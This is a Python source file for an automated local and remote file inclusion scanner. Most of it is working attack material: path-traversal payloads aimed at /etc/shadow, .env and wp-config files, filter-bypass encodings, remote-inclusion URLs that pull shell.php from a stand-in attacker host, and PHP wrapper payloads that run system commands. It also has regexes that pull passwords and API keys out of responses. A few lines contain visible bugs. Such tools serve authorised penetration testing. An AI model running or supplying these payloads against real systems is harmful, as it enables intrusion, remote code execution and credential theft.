import re
import time
import os
import base64
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from colorama import Fore, Style, Back, init
from datetime import datetime

# Initialize colorama
init(autoreset=True)

class LFIRFIScanner:
    def __init__(self):
        self.name = "📁 ADVANCED LFI/RFI VULNERABILITY SCANNER"
        self.version = "3.8"
        self.author = "Security Research Team"
        
        # Enhanced color scheme
        self.colors = {
            'banner': Fore.MAGENTA + Style.BRIGHT,
            'header': Fore.WHITE + Style.BRIGHT,
            'info': Fore.CYAN + Style.BRIGHT,
            'success': Fore.GREEN + Style.BRIGHT,
            'warning': Fore.YELLOW + Style.BRIGHT,
            'error': Fore.RED + Style.BRIGHT,
            'critical': Back.RED + Fore.WHITE + Style.BRIGHT,
            'lfi': Fore.RED + Style.BRIGHT,
            'rfi': Fore.MAGENTA + Style.BRIGHT,
            'payload': Fore.YELLOW + Style.BRIGHT,
            'parameter': Fore.BLUE + Style.BRIGHT,
            'file': Fore.CYAN + Style.NORMAL,
            'directory': Fore.GREEN + Style.NORMAL,
            'timestamp': Fore.LIGHTBLACK_EX,
            'separator': Fore.LIGHTBLACK_EX + Style.DIM,
            'highlight': Fore.YELLOW + Back.BLACK + Style.BRIGHT,
            'evidence': Fore.LIGHTCYAN_EX + Style.BRIGHT,
            'bypass': Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        }
        
        # Comprehensive LFI payloads with categories
        self.lfi_payloads = {
            'basic': [
                '../../../../etc/passwd',
                '../../../../etc/hosts',
                '../../../../etc/group',
                '../../../../etc/shadow',
                '../../../../etc/hostname',
                '../../../../etc/issue',
                '../../../../etc/motd',
                '../../../../etc/resolv.conf'
            ],
            'windows': [
                '../../../../windows/win.ini',
                '../../../../boot.ini',
                '../../../../windows/system.ini',
                '../../../../windows/system32/drivers/etc/hosts',
                '../../../../windows/repair/sam',
                '../../../../windows/win.ini',
                '../../../../windows/debug/netlog.log',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
            ],
            'log_files': [
                '../../../../var/log/auth.log',
                '../../../../var/log/apache2/access.log',
                '../../../../var/log/apache2/error.log',
                '../../../../var/log/nginx/access.log',
                '../../../../var/log/nginx/error.log',
                '../../../../var/log/syslog',
                '../../../../var/log/messages',
                '../../../../var/log/secure',
                '../../../../var/log/httpd/access_log',
                '../../../../var/log/httpd/error_log'
            ],
            'proc_files': [
                '../../../../proc/self/environ',
                '../../../../proc/self/cmdline',
                '../../../../proc/self/status',
                '../../../../proc/version',
                '../../../../proc/cpuinfo',
                '../../../../proc/meminfo',
                '../../../../proc/net/arp',
                '../../../../proc/net/tcp'
            ],
            'php_wrappers': [
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'php://filter/resource=index.php',
                'php://input',
                'php://stdin',
                'php://memory',
                'php://temp',
                'phar://path/to/archive.phar/file.txt',
                'zip://path/to/archive.zip#file.txt',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
                'data://text/plain,<?php phpinfo(); ?>',
                'expect://ls',
                'expect://id'
            ],
            'config_files': [
                '../../../../.env',
                '../../../../.env.local',
                '../../../../.env.production',
                '../../../../config.php',
                '../../../../config/database.php',
                '../../../../config/settings.php',
                '../../../../wp-config.php',
                '../../../../application/config/database.php',
                '../../../../app/config/database.php',
                '../../../../database.yml',
                '../../../../settings.py',
                '../../../../.htaccess',
                '../../../../.htpasswd',
                '../../../../web.config',
                '../../../../robots.txt'
            ],
            'bypass_techniques': [
                '....//....//....//....//etc/passwd',
                '..//..//..//..//etc/passwd',
                '../.../.././../.../././etc/passwd',
                '..%2f..%2f..%2f..%2fetc%2fpasswd',
                '..%252f..%252f..%252f..%252fetc%252fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
                '../../../../etc/passwd%00',
                '../../../../etc/passwd\x00',
                '../../../../etc/passwd%2500',
                '/etc/passwd',
                '..../////..../////..../////..../////etc/passwd',
                '..;./..;./..;./..;./etc/passwd',
                '..;/..;/..;/..;/etc/passwd'
            ],
            'source_code': [
                '../../../../index.php',
                '../../../../index.php.bak',
                '../../../../admin.php',
                '../../../../login.php',
                '../../../../config.php.bak',
                '../../../../.git/HEAD',
                '../../../../.git/config',
                '../../../../composer.json',
                '../../../../package.json',
                '../../../../README.md'
            ]
        }
        
        # Comprehensive RFI payloads
        self.rfi_payloads = {
            'direct': [
                'http://evil.example.com/shell.txt',
                'https://raw.githubusercontent.com/evil/backdoor/main/shell.php',
                'ftp://evil.example.com/backdoor.php',
                '\\\\evil.example.com\\share\\shell.php',
                '//evil.example.com/share/shell.php'
            ],
            'bypass': [
                'http://localhost:8080/exploit.php',
                'http://127.0.0.1:8000/payload.php',
                'http://[::1]:8080/shell.php',
                'http://0x7f000001/shell.php',  # 127.0.0.1 in hex
                'http://2130706433/shell.php',   # 127.0.0.1 in decimal
                'http://127.1/shell.php',
                'http://127.0.0.0.1/shell.php'
            ],
            'data_wrapper': [
                'data:text/plain,<?php system("id"); ?>',
                'data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==',
                'data:text/plain,<?php echo "RFI Test"; ?>',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
            ],
            'input_wrapper': [
                'php://input',
                'php://stdin',
                'php://fd/0'
            ],
            'expect_wrapper': [
                'expect://ls',
                'expect://id',
                'expect://whoami',
                'expect://cat /etc/passwd'
            ]
        }
        
        # Common LFI/RFI parameters
        self.common_params = [
            'file', 'page', 'dir', 'path', 'document', 'folder', 
            'root', 'cat', 'action', 'board', 'date', 'detail', 
            'download', 'prefix', 'include', 'inc', 'locate', 
            'show', 'doc', 'site', 'type', 'view', 'content', 
            'layout', 'mod', 'conf', 'config', 'load', 'src',
            'url', 'data', 'input', 'template', 'module', 'script',
            'filename', 'name', 'language', 'lang', 'theme',
            'skin', 'stylesheet', 'style', 'php', 'phpbb_root_path',
            'pg', 'p', 'q', 'redirect', 'goto', 'next', 'home',
            'from', 'to', 'return', 'ret', 'link', 'target'
        ]
        
        # LFI detection patterns
        self.lfi_indicators = {
            'critical': [
                r'root:x:\d+:\d+:[^:]*:[^:]*:[^:]*',
                r'daemon:x:\d+:\d+:[^:]*:[^:]*:[^:]*',
                r'bin:x:\d+:\d+:[^:]*:[^:]*:[^:]*',
                r'sys:x:\d+:\d+:[^:]*:[^:]*:[^:]*',
                r'\[boot loader\]',
                r'\[fonts\]',
                r'PATH=/usr/local/sbin',
                r'HTTP_USER_AGENT=',
                r'DOCUMENT_ROOT=',
                r'REMOTE_ADDR=',
                r'HTTP_ACCEPT=',
                r'SERVER_SOFTWARE=',
                r'SCRIPT_FILENAME='
            ],
            'high': [
                r'DB_PASSWORD=[^\s]+',
                r'DB_USER=[^\s]+',
                r'SECRET_KEY=[^\s]+',
                r'API_KEY=[^\s]+',
                r'AWS_ACCESS_KEY=[^\s]+',
                r'password\s*=\s*[^\s]+',
                r'passwd\s*=\s*[^\s]+'
            ],
            'medium': [
                r'<?php',
                r'<\?php',
                r'class\s+\w+',
                r'function\s+\w+',
                r'namespace\s+\w+',
                r'use\s+\w+',
                r'require_once',
                r'include_once',
                r'define\('
            ],
            'low': [
                r'No such file or directory',
                r'failed to open stream',
                r'Warning.*include',
                r'Warning.*require',
                r'open_basedir restriction',
                r'File not found',
                r'Access denied'
            ]
        }
        
        # RFI detection patterns
        self.rfi_indicators = {
            'critical': [
                r'evil\.example\.com',
                r'raw\.githubusercontent\.com',
                r'<?php\s+system\(',
                r'<?php\s+exec\(',
                r'<?php\s+shell_exec\(',
                r'<?php\s+passthru\(',
                r'<?php\s+eval\(',
                r'base64_decode\(',
                r'gzinflate\('
            ],
            'high': [
                r'RFI Test',
                r'Remote File Inclusion',
                r'localhost:\d+',
                r'127\.0\.0\.1:\d+',
                r'\[::1\]:\d+'
            ]
        }
        
        # File signatures for different file types
        self.file_signatures = {
            'linux_passwd': r'^[^:]+:[^:]*:\d+:\d+:[^:]*:[^:]*:[^:]*$',
            'windows_ini': r'^\[.+\]$',
            'php_file': r'^<\?php',
            'config_file': r'(DB_|PASSWORD|SECRET|KEY|TOKEN)[=:]',
            'log_file': r'^\d{4}-\d{2}-\d{2}'
        }
        
        # Risk levels
        self.risk_levels = {
            'critical': {
                'color': Back.RED + Fore.WHITE + Style.BRIGHT,
                'score': 50,
                'description': 'Successful file read with sensitive data'
            },
            'high': {
                'color': Fore.RED + Style.BRIGHT,
                'score': 30,
                'description': 'Successful file read but no sensitive data'
            },
            'medium': {
                'color': Fore.YELLOW + Style.BRIGHT,
                'score': 20,
                'description': 'Partial read or error revealing path'
            },
            'low': {
                'color': Fore.BLUE + Style.BRIGHT,
                'score': 10,
                'description': 'Potential vulnerability detected'
            }
        }

    def print_banner(self):
        """Display enhanced scanner banner"""
        banner = f"""
{self.colors['banner']}{"="*90}
{self.colors['header']}╔════════════════════════════════════════════════════════════════════════════╗
║ {self.colors['banner']}{self.name:^78} {self.colors['header']}║
║ {self.colors['info']}Version: {self.version:<70} {self.colors['header']}║
║ {self.colors['info']}Author: {self.author:<70} {self.colors['header']}║
╚════════════════════════════════════════════════════════════════════════════╝
{self.colors['banner']}{"="*90}
"""
        print(banner)

    def print_status(self, message, level="info", indent=0, payload=None):
        """Print colored status messages with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "info": f"{self.colors['info']}[ℹ]",
            "success": f"{self.colors['success']}[✓]",
            "warning": f"{self.colors['warning']}[⚠]",
            "error": f"{self.colors['error']}[✗]",
            "critical": f"{self.colors['critical']}[‼]",
            "lfi": f"{self.colors['lfi']}[📁]",
            "rfi": f"{self.colors['rfi']}[🌐]",
            "payload": f"{self.colors['payload']}[🎯]",
            "parameter": f"{self.colors['parameter']}[🔧]",
            "scan": f"{self.colors['info']}[🔍]",
            "bypass": f"{self.colors['bypass']}[🌀]"
        }.get(level, f"{self.colors['info']}[*]")
        
        indent_str = "  " * indent
        payload_str = f" {self.colors['payload']}{payload}" if payload else ""
        print(f"{self.colors['timestamp']}[{timestamp}] {prefix}{Style.RESET_ALL} {indent_str}{message}{payload_str}")

    def scan(self, target, options=None):
        """Comprehensive LFI/RFI vulnerability scanning"""
        self.print_banner()
        
        results = {
            'target': target,
            'lfi_vulnerabilities': [],
            'rfi_vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0,
            'successful_tests': 0,
            'risk_score': 0,
            'start_time': time.time(),
            'end_time': None,
            'scan_duration': None
        }
        
        try:
            from utils.request_wrapper import RequestWrapper
            req = RequestWrapper()
            
            self.print_status(f"Initiating LFI/RFI scan on target: {self.colors['highlight']}{target}", "info")
            
            # Parse URL and extract parameters
            parsed_url = urlparse(target)
            query_params = parse_qs(parsed_url.query)
            
            # If no parameters in URL, try to discover parameters
            if not query_params:
                self.print_status("No parameters found in URL. Attempting parameter discovery...", "warning")
                discovered_params = self.discover_parameters(target, req)
                if discovered_params:
                    query_params = discovered_params
                    self.print_status(f"Discovered {len(discovered_params)} parameters", "success")
                else:
                    self.print_status("No parameters discovered. Using common parameters...", "info")
                    # Use common parameters with dummy values
                    query_params = {param: ['test'] for param in self.common_params[:5]}
            
            # Phase 1: LFI Scanning
            self.print_status("Phase 1: Scanning for Local File Inclusion (LFI) vulnerabilities...", "scan")
            lfi_results = self.scan_lfi(target, query_params, req)
            results['lfi_vulnerabilities'] = lfi_results['vulnerabilities']
            results['tested_parameters'] += lfi_results['tested_parameters']
            results['tested_payloads'] += lfi_results['tested_payloads']
            results['successful_tests'] += len(lfi_results['vulnerabilities'])
            
            # Phase 2: RFI Scanning
            self.print_status("Phase 2: Scanning for Remote File Inclusion (RFI) vulnerabilities...", "scan")
            rfi_results = self.scan_rfi(target, query_params, req)
            results['rfi_vulnerabilities'] = rfi_results['vulnerabilities']
            results['tested_parameters'] += rfi_results['tested_parameters']
            results['tested_payloads'] += rfi_results['tested_payloads']
            results['successful_tests'] += len(rfi_results['vulnerabilities'])
            
            # Phase 3: Advanced Bypass Techniques
            if options and options.get('advanced_bypass', False):
                self.print_status("Phase 3: Testing advanced bypass techniques...", "scan")
                bypass_results = self.test_bypass_techniques(target, query_params, req)
                results['lfi_vulnerabilities'].extend(bypass_results.get('lfi', []))
                results['rfi_vulnerabilities'].extend(bypass_results.get('rfi', []))
                results['tested_payloads'] += bypass_results.get('tested_payloads', 0)
            
            # Calculate risk score
            results['risk_score'] = self.calculate_risk_score(results)
            
            # Complete scan
            results['end_time'] = time.time()
            results['scan_duration'] = results['end_time'] - results['start_time']
            
            # Print comprehensive report
            self.print_summary(results)
            
            return results
            
        except Exception as e:
            self.print_status(f"Scan error: {str(e)}", "error")
            results['error'] = str(e)
            results['end_time'] = time.time()
            return results

    def discover_parameters(self, target, req):
        """Discover parameters by analyzing the page"""
        discovered_params = {}
        
        try:
            # Get the base page
            response = req.get(target)
            
            # Look for forms
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find form inputs
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name and name not in discovered_params:
                        discovered_params[name] = ['test']
            
            # Look for links with parameters
            links = soup.find_all('a', href=True)
            for link in links['href']:
                if '?' in link:
                    parsed = urlparse(link)
                    params = parse_qs(parsed.query)
                    discovered_params.update(params)
            
            # Check for common parameters in JavaScript
            script_tags = soup.find_all('script')
            for script in script_tags:
                if script.string:
                    for param in self.common_params:
                        if param in script.string:
                            discovered_params[param] = ['test']
            
        except Exception as e:
            self.print_status(f"Parameter discovery error: {e}", "error")
        
        return discovered_params

    def scan_lfi(self, target, query_params, req):
        """Scan for LFI vulnerabilities"""
        results = {
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0
        }
        
        self.print_status(f"Testing {len(query_params)} parameters for LFI...", "info", 1)
        
        for param_name in query_params:
            self.print_status(f"Testing parameter: {param_name}", "parameter", 2)
            
            # Test each category of LFI payloads
            for category, payloads in self.lfi_payloads.items():
                self.print_status(f"Testing {category} payloads...", "payload", 3)
                
                for payload in payloads[:10]:  # Limit to first 10 per category for speed
                    try:
                        # Create test parameters
                        test_params = query_params.copy()
                        test_params[param_name] = payload
                        
                        # Make request
                        response = req.get(target, params=test_params, timeout=15)
                        results['tested_payloads'] += 1
                        
                        # Analyze response
                        analysis = self.analyze_lfi_response(response, payload)
                        
                        if analysis['is_vulnerable']:
                            vulnerability = {
                                'type': 'LFI',
                                'parameter': param_name,
                                'payload': payload,
                                'category': category,
                                'url': response.url,
                                'status_code': response.status_code,
                                'evidence': analysis['evidence'],
                                'risk_level': analysis['risk_level'],
                                'confidence': analysis['confidence'],
                                'file_type': analysis['file_type'],
                                'sensitive_data': analysis['sensitive_data']
                            }
                            
                            results['vulnerabilities'].append(vulnerability)
                            
                            # Print finding
                            color = self.risk_levels.get(analysis['risk_level'], {}).get('color', Fore.RED)
                            self.print_status(f"{color}LFI found! Parameter: {param_name} | Payload: {payload}", "lfi", 3)
                            self.print_status(f"Evidence: {analysis['evidence'][:100]}...", "evidence", 4)
                            
                            # Don't test more payloads for this parameter if we found a vulnerability
                            break
                        
                        time.sleep(0.1)  # Rate limiting
                        
                    except Exception as e:
                        continue
                
                results['tested_parameters'] += 1
        
        return results

    def scan_rfi(self, target, query_params, req):
        """Scan for RFI vulnerabilities"""
        results = {
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0
        }
        
        self.print_status(f"Testing {len(query_params)} parameters for RFI...", "info", 1)
        
        for param_name in query_params:
            self.print_status(f"Testing parameter: {param_name}", "parameter", 2)
            
            # Test each category of RFI payloads
            for category, payloads in self.rfi_payloads.items():
                self.print_status(f"Testing {category} payloads...", "payload", 3)
                
                for payload in payloads[:5]:  # Limit to first 5 per category
                    try:
                        # Create test parameters
                        test_params = query_params.copy()
                        test_params[param_name] = payload
                        
                        # Make request
                        response = req.get(target, params=test_params, timeout=20)
                        results['tested_payloads'] += 1
                        
                        # Analyze response
                        analysis = self.analyze_rfi_response(response, payload)
                        
                        if analysis['is_vulnerable']:
                            vulnerability = {
                                'type': 'RFI',
                                'parameter': param_name,
                                'payload': payload,
                                'category': category,
                                'url': response.url,
                                'status_code': response.status_code,
                                'evidence': analysis['evidence'],
                                'risk_level': analysis['risk_level'],
                                'confidence': analysis['confidence'],
                                'remote_execution': analysis['remote_execution']
                            }
                            
                            results['vulnerabilities'].append(vulnerability)
                            
                            # Print finding
                            color = self.risk_levels.get(analysis['risk_level'], {}).get('color', Fore.RED)
                            self.print_status(f"{color}RFI found! Parameter: {param_name} | Payload: {payload}", "rfi", 3)
                            self.print_status(f"Evidence: {analysis['evidence'][:100]}...", "evidence", 4)
                            
                            # Don't test more payloads for this parameter if we found a vulnerability
                            break
                        
                        time.sleep(0.2)  # Rate limiting for RFI (slower)
                        
                    except Exception as e:
                        continue
                
                results['tested_parameters'] += 1
        
        return results

    def analyze_lfi_response(self, response, payload):
        """Analyze response for LFI indicators"""
        analysis = {
            'is_vulnerable': False,
            'risk_level': 'low',
            'confidence': 0,
            'evidence': '',
            'file_type': 'unknown',
            'sensitive_data': []
        }
        
        response_text = response.text
        response_lower = response_text.lower()
        
        # Check for various indicators
        indicators_found = []
        
        # Check critical indicators
        for pattern in self.lfi_indicators['critical']:
            if re.search(pattern, response_text, re.MULTILINE | re.IGNORECASE):
                indicators_found.append(('critical', pattern))
                analysis['confidence'] += 40
        
        # Check high indicators
        for pattern in self.lfi_indicators['high']:
            if re.search(pattern, response_text, re.MULTILINE | re.IGNORECASE):
                indicators_found.append(('high', pattern))
                analysis['confidence'] += 30
        
        # Check medium indicators
        for pattern in self.lfi_indicators['medium']:
            if re.search(pattern, response_text, re.MULTILINE):
                indicators_found.append(('medium', pattern))
                analysis['confidence'] += 20
        
        # Check low indicators (errors)
        for pattern in self.lfi_indicators['low']:
            if re.search(pattern, response_text, re.IGNORECASE):
                indicators_found.append(('low', pattern))
                analysis['confidence'] += 10
        
        # Determine if vulnerable
        if indicators_found:
            analysis['is_vulnerable'] = True
            
            # Set risk level based on highest severity indicator
            severities = [ind[0] for ind in indicators_found]
            if 'critical' in severities:
                analysis['risk_level'] = 'critical'
            elif 'high' in severities:
                analysis['risk_level'] = 'high'
            elif 'medium' in severities:
                analysis['risk_level'] = 'medium'
            else:
                analysis['risk_level'] = 'low'
            
            # Determine file type
            for file_type, pattern in self.file_signatures.items():
                if re.search(pattern, response_text, re.MULTILINE):
                    analysis['file_type'] = file_type
                    break
            
            # Extract evidence
            if len(response_text) > 500:
                evidence_start = response_text.find(payload.split('/')[-1]) if '/' in payload else 0
                evidence_start = max(0, evidence_start - 50)
                analysis['evidence'] = response_text[evidence_start:evidence_start + 200]
            else:
                analysis['evidence'] = response_text[:200]
            
            # Extract sensitive data
            for level, patterns in self.lfi_indicators.items():
                if level in ['critical', 'high']:
                    for pattern in patterns:
                        matches = re.findall(pattern, response_text, re.MULTILINE | re.IGNORECASE)
                        for match in matches[:3]:  # Limit to 3 matches
                            if len(match) > 0:
                                analysis['sensitive_data'].append(match[:100])
        
        # Cap confidence at 100
        analysis['confidence'] = min(analysis['confidence'], 100)
        
        return analysis

    def analyze_rfi_response(self, response, payload):
        """Analyze response for RFI indicators"""
        analysis = {
            'is_vulnerable': False,
            'risk_level': 'low',
            'confidence': 0,
            'evidence': '',
            'remote_execution': False
        }
        
        response_text = response.text
        response_lower = response_text.lower()
        
        # Check for RFI indicators
        indicators_found = []
        
        # Check critical indicators (remote code execution)
        for pattern in self.rfi_indicators['critical']:
            if re.search(pattern, response_text, re.MULTILINE | re.IGNORECASE):
                indicators_found.append(('critical', pattern))
                analysis['confidence'] += 50
                analysis['remote_execution'] = True
        
        # Check high indicators (RFI attempt detection)
        for pattern in self.rfi_indicators['high']:
            if re.search(pattern, response_text, re.MULTILINE | re.IGNORECASE):
                indicators_found.append(('high', pattern))
                analysis['confidence'] += 30
        
        # Check for PHP errors that might indicate RFI attempt
        php_errors = [
            r'failed to open stream.*http',
            r'URL file-access is disabled',
            r'allow_url_fopen.*disabled',
            r'allow_url_include.*disabled'
        ]
        
        for error in php_errors:
            if re.search(error, response_text, re.IGNORECASE):
                indicators_found.append(('medium', error))
                analysis['confidence'] += 20
        
        # Determine if vulnerable
        if indicators_found:
            analysis['is_vulnerable'] = True
            
            # Set risk level
            severities = [ind[0] for ind in indicators_found]
            if 'critical' in severities:
                analysis['risk_level'] = 'critical'
            elif 'high' in severities:
                analysis['risk_level'] = 'high'
            else:
                analysis['risk_level'] = 'medium'
            
            # Extract evidence
            if len(response_text) > 500:
                # Look for the payload in response
                for part in payload.split('/'):
                    if part in response_text:
                        idx = response_text.find(part)
                        analysis['evidence'] = response_text[max(0, idx-50):idx+150]
                        break
                if not analysis['evidence']:
                    analysis['evidence'] = response_text[:200]
            else:
                analysis['evidence'] = response_text
        
        # Cap confidence at 100
        analysis['confidence'] = min(analysis['confidence'], 100)
        
        return analysis

    def test_bypass_techniques(self, target, query_params, req):
        """Test advanced bypass techniques"""
        results = {
            'lfi': [],
            'rfi': [],
            'tested_payloads': 0
        }
        
        self.print_status("Testing advanced bypass techniques...", "bypass", 1)
        
        # Test encoding bypasses
        encoding_techniques = [
            ('url_encode', lambda x: urllib.parse.quote(x)),
            ('double_url_encode', lambda x: urllib.parse.quote(urllib.parse.quote(x))),
            ('utf8_encode', lambda x: x.encode('utf-8').decode('latin-1')),
            ('null_byte', lambda x: x + '%00'),
            ('double_null', lambda x: x + '%00%00')
        ]
        
        for param_name in query_params:
            for technique_name, encode_func in encoding_techniques:
                # Test LFI bypass
                for payload in self.lfi_payloads['basic'][:3]:
                    try:
                        encoded_payload = encode_func(payload)
                        test_params = query_params.copy()
                        test_params[param_name] = encoded_payload
                        
                        response = req.get(target, params=test_params, timeout=15)
                        results['tested_payloads'] += 1
                        
                        analysis = self.analyze_lfi_response(response, payload)
                        if analysis['is_vulnerable']:
                            vulnerability = {
                                'type': 'LFI_BYPASS',
                                'parameter': param_name,
                                'payload': payload,
                                'technique': technique_name,
                                'encoded_payload': encoded_payload,
                                'url': response.url,
                                'evidence': analysis['evidence'],
                                'risk_level': analysis['risk_level']
                            }
                            results['lfi'].append(vulnerability)
                            self.print_status(f"Bypass successful! Technique: {technique_name}", "bypass", 2)
                    except:
                        continue
        
        return results

    def calculate_risk_score(self, results):
        """Calculate overall risk score"""
        score = 0
        
        # Add scores for LFI vulnerabilities
        for vuln in results['lfi_vulnerabilities']:
            risk_level = vuln.get('risk_level', 'low')
            score += self.risk_levels.get(risk_level, {}).get('score', 10)
        
        # Add scores for RFI vulnerabilities
        for vuln in results['rfi_vulnerabilities']:
            risk_level = vuln.get('risk_level', 'low')
            score += self.risk_levels.get(risk_level, {}).get('score', 10) * 1.5  # RFI is more dangerous
        
        # Bonus for multiple vulnerabilities
        total_vulns = len(results['lfi_vulnerabilities']) + len(results['rfi_vulnerabilities'])
        if total_vulns > 3:
            score += 20
        elif total_vulns > 1:
            score += 10
        
        return min(score, 100)

    def print_summary(self, results):
        """Print comprehensive scan summary"""
        duration = results.get('scan_duration', 0)
        
        summary = f"""
{self.colors['separator']}{"="*90}
{self.colors['header']}📊 LFI/RFI SCAN SUMMARY
{self.colors['separator']}{"-"*90}
{self.colors['info']}Target URL:           {results['target']}
{self.colors['info']}Scan Duration:        {duration:.2f} seconds
{self.colors['info']}Parameters Tested:    {results['tested_parameters']}
{self.colors['info']}Payloads Tested:      {results['tested_payloads']}
{self.colors['info']}Successful Tests:     {results['successful_tests']}
{self.colors['info']}Risk Score:           {results['risk_score']}/100
{self.colors['separator']}{"-"*90}
"""
        print(summary)
        
        # Print LFI vulnerabilities
        if results['lfi_vulnerabilities']:
            print(f"\n{self.colors['header']}📁 LOCAL FILE INCLUSION VULNERABILITIES ({len(results['lfi_vulnerabilities'])}):")
            print(f"{self.colors['separator']}{'-'*90}")
            
            for i, vuln in enumerate(results['lfi_vulnerabilities'], 1):
                color = self.risk_levels.get(vuln['risk_level'], {}).get('color', Fore.RED)
                
                print(f"{color}▶ {i}. {vuln['risk_level'].upper()}: Parameter '{vuln['parameter']}'")
                print(f"{self.colors['info']}   Payload: {vuln['payload'][:50]}")
                print(f"{self.colors['info']}   Category: {vuln.get('category', 'Unknown')}")
                print(f"{self.colors['info']}   File Type: {vuln.get('file_type', 'Unknown')}")
                print(f"{self.colors['info']}   Confidence: {vuln.get('confidence', 0)}%")
                
                if vuln.get('sensitive_data'):
                    print(f"{self.colors['warning']}   Sensitive Data Found: {len(vuln['sensitive_data'])} items")
                
                print(f"{self.colors['timestamp']}   URL: {vuln['url'][:80]}...")
                print(f"{self.colors['separator']}{'-'*40}")
        
        # Print RFI vulnerabilities
        if results['rfi_vulnerabilities']:
            print(f"\n{self.colors['header']}🌐 REMOTE FILE INCLUSION VULNERABILITIES ({len(results['rfi_vulnerabilities'])}):")
            print(f"{self.colors['separator']}{'-'*90}")
            
            for i, vuln in enumerate(results['rfi_vulnerabilities'], 1):
                color = self.risk_levels.get(vuln['risk_level'], {}).get('color', Fore.MAGENTA)
                
                print(f"{color}▶ {i}. {vuln['risk_level'].upper()}: Parameter '{vuln['parameter']}'")
                print(f"{self.colors['info']}   Payload: {vuln['payload'][:50]}")
                print(f"{self.colors['info']}   Category: {vuln.get('category', 'Unknown')}")
                print(f"{self.colors['info']}   Remote Execution: {vuln.get('remote_execution', False)}")
                print(f"{self.colors['info']}   Confidence: {vuln.get('confidence', 0)}%")
                print(f"{self.colors['timestamp']}   URL: {vuln['url'][:80]}...")
                print(f"{self.colors['separator']}{'-'*40}")
        
        # Print recommendations
        recommendations = self.generate_recommendations(results)
        if recommendations:
            print(f"\n{self.colors['header']}💡 RECOMMENDATIONS:")
            print(f"{self.colors['separator']}{'-'*90}")
            
            for i, rec in enumerate(recommendations, 1):
                priority_color = {
                    'critical': Back.RED + Fore.WHITE,
                    'high': Fore.RED + Style.BRIGHT,
                    'medium': Fore.YELLOW + Style.BRIGHT,
                    'low': Fore.BLUE + Style.BRIGHT
                }.get(rec['priority'], Fore.WHITE)
                
                print(f"{priority_color}{i}. [{rec['priority'].upper()}] {rec['title']}")
                print(f"{self.colors['info']}   {rec['description']}")
                print()
        
        # Final status
        total_vulns = len(results['lfi_vulnerabilities']) + len(results['rfi_vulnerabilities'])
        
        if total_vulns > 0:
            if results['risk_score'] > 70:
                print(f"{self.colors['critical']}⚠ CRITICAL LFI/RFI VULNERABILITIES DETECTED! Immediate action required.")
            else:
                print(f"{self.colors['warning']}⚠ LFI/RFI vulnerabilities found. Review and fix immediately.")
        else:
            print(f"{self.colors['success']}✅ No LFI/RFI vulnerabilities detected.")
        
        print(f"{self.colors['separator']}{'='*90}\n")

    def generate_recommendations(self, results):
        """Generate targeted recommendations"""
        recommendations = []
        
        total_vulns = len(results['lfi_vulnerabilities']) + len(results['rfi_vulnerabilities'])
        
        if total_vulns > 0:
            if results['lfi_vulnerabilities']:
                recommendations.append({
                    'priority': 'critical' if any(v['risk_level'] == 'critical' for v in results['lfi_vulnerabilities']) else 'high',
                    'title': 'Fix LFI Vulnerabilities',
                    'description': f'Implement proper input validation and sanitization for {len(results["lfi_vulnerabilities"])} LFI vulnerabilities'
                })
            
            if results['rfi_vulnerabilities']:
                recommendations.append({
                    'priority': 'critical',
                    'title': 'Fix RFI Vulnerabilities',
                    'description': f'Disable remote file inclusion and implement allowlists for {len(results["rfi_vulnerabilities"])} RFI vulnerabilities'
                })
        
        # General recommendations
        recommendations.extend([
            {
                'priority': 'high',
                'title': 'Input Validation',
                'description': 'Validate and sanitize all user inputs, especially file paths and URLs'
            },
            {
                'priority': 'high',
                'title': 'Disable Dangerous Functions',
                'description': 'Disable allow_url_fopen and allow_url_include in PHP configuration'
            },
            {
                'priority': 'medium',
                'title': 'Implement Allowlists',
                'description': 'Use allowlists for file inclusions instead of dynamic paths'
            },
            {
                'priority': 'low',
                'title': 'Regular Security Audits',
                'description': 'Perform regular security scans and code reviews'
            }
        ])
        
        return sorted(recommendations, key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}[x['priority']])

    def generate_test_cases(self):
        """Generate test cases for manual testing"""
        test_cases = {
            'LFI': {
                'Basic': self.lfi_payloads['basic'],
                'Windows': self.lfi_payloads['windows'],
                'Log Poisoning': self.lfi_payloads['log_files'],
                'PHP Wrappers': self.lfi_payloads['php_wrappers']
            },
            'RFI': {
                'Direct': self.rfi_payloads['direct'],
                'Bypass': self.rfi_payloads['bypass'],
                'Data Wrapper': self.rfi_payloads['data_wrapper']
            }
        }
        return test_cases

# Example usage
if __name__ == "__main__":
    scanner = LFIRFIScanner()
    
    # Run scan
    target_url = "http://example.com/page.php?file=index.html"
    results = scanner.scan(target_url)
    
    # Generate test cases
    test_cases = scanner.generate_test_cases()
    print(f"\n{Fore.CYAN}Generated {sum(len(v) for v in test_cases['LFI'].values())} LFI test cases")
    print(f"{Fore.MAGENTA}Generated {sum(len(v) for v in test_cases['RFI'].values())} RFI test cases")